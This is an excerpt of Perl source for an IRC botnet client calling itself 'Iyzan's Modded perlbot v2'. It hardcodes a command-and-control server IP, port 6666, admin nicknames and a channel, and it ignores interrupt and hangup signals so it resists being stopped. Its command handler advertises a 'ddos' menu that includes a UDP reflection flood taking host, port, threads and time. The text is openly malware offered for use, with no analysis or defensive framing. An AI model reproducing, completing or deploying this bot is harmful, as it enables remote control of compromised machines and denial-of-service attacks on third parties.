...
my $id=""; 
############################################ 
my @adms=("chode", "tbot", "XenoMorph", "Roddy", "dav"); 
my @canais=("#chode"); 
my $chanpass = ""; 
##Cron 
$num = int rand(10000); 
...
$servidor='167.114.153.205' unless $servidor; 
my $porta='6666';  
############################################ 
$SIG{'INT'} = 'IGNORE'; 
$SIG{'HUP'} = 'IGNORE'; 
...
###################### 
         if ($funcarg =~ /^commands/) { 
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@9-[Iyzan's Modded  Perl Bot Commands List]-14@4] "); 
         ...
         if ($funcarg =~ /^ddos/) { 
			...
			sendraw($IRC_cur_socket, "PRIVMSG $printl :7-shell 14@3sudp <host> <port> <reflection file> <threads> <time> | Requires ./50 installed"); 
...
#######################       
         if ($funcarg =~ /^version/) { 
           sendraw($IRC_cur_socket, "PRIVMSG $printl :12|4.:3Version4:.12|4 Iyzan's Modded perlbot v2."); 
         } 
####################### 
# End of Version info # 
#######################           
